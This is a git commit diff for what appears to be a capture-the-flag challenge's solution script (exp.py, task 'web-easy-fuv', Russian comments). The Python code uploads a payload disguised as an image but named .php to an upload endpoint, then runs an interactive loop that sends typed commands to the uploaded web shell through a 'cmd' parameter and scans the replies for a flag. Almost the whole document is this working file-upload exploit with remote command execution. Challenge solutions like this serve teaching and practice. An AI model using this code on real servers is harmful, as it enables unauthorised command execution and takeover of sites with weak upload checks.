acf839d19dd9f60e946c3b9a3a44ccd5d5a137d7
d4nd3lion77 <zaitcevdenis32@gmail.com>
2024-11-24 20:51:37 +0300

    VKA-kids2024

--- categories/web/web-easy-fuv/solution/exp.py
+++ categories/web/web-easy-fuv/solution/exp.py
@@ -3,14 +3,15 @@ import requests,sys,re
 s = requests.Session()
 url = sys.argv[1]
 # отправляем файл на сервер
-with open('your_image_with_payload', 'rb') as f:
+with open('payload_file.png', 'rb') as f:
     img = f.read()
 res = s.post(f'{url}/upload.php', files={
-     "fileToUpload": (f"your_image_with_payload.php", img, "image/jpeg")})
-# веб шел
+     "fileToUpload": (f"ksbbnkajbneqkrvnavrnljanrvkanrvkjnrknakjbjnkjab.php", img, "image/jpeg")})
+print(res.text)
+#веб шел
 while True:
     cmd = input('введи команду:')     
-    res = s.get(f'{url}/uploads/your_image_with_payload.php?cmd={cmd}')
+    res = s.get(f'{url}/uploads/ksbbnkajbneqkrvnavrnljanrvkanrvkjnrknakjbjnkjab.php?cmd={cmd}')
     if (re.search("vka\{.*\}",res.text)):
         flag = re.findall("vka{.*}",res.text)
         print(flag)
